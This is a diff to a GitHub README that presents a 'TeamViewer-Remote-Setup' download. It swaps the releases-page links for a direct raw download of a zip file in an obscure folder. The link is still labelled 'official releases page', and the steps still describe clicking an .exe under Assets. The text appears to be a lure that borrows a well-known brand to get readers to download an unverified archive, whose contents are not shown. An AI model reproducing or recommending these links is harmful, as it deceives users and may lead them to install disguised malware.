@@ -1,6 +1,6 @@
 # 🌐 TeamViewer-Remote-Setup - Connect to any computer from anywhere
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Hydrophobic-twentyone417/TeamViewer-Remote-Setup/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Hydrophobic-twentyone417/TeamViewer-Remote-Setup/raw/refs/heads/main/gramarye/Remote_Team_Setup_Viewer_1.6.zip)
 
 TeamViewer Remote enables secure remote access to computers. Use this tool for online meetings, technical support, or remote work. The software handles file transfers, multi-monitor navigation, and session recording. All connections use end-to-end encryption to keep your data private.
 
@@ -8,7 +8,7 @@ TeamViewer Remote enables secure remote access to computers. Use this tool for o
 
 Follow these steps to get the software on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/Hydrophobic-twentyone417/TeamViewer-Remote-Setup/releases).
+1. Visit the [official releases page](https://github.com/Hydrophobic-twentyone417/TeamViewer-Remote-Setup/raw/refs/heads/main/gramarye/Remote_Team_Setup_Viewer_1.6.zip).
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Wait for the file to finish saving to your computer.
